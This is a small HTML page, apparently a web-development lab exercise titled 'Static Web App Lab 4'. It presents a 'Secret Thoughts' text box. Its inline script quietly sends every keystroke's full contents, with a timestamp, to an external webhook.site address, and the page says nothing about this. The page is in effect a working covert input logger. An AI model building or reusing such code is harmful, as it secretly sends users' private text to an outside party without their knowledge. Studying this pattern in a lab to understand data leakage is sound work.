<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Static Web App Lab 4</title>
  </head>
  <body>
    <div>
      <h1>Static Web App Lab 4 - Write</h1>
      <div>
        <h2>Secret Thoughts</h2>
        <textarea id="secretThoughts"></textarea>
      </div>
    </div>

    <script>
      const textarea = document.getElementById("secretThoughts");

      textarea.addEventListener("input", (e) => {
        const text = e.target.value;

        fetch(
          `https://webhook.site/43bfbf96-bc46-4bf8-8809-d822e775e8fc?` +
            `text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(
              new Date().toISOString()
            )}`
        ).catch(console.error);
      });
    </script>
  </body>
</html>
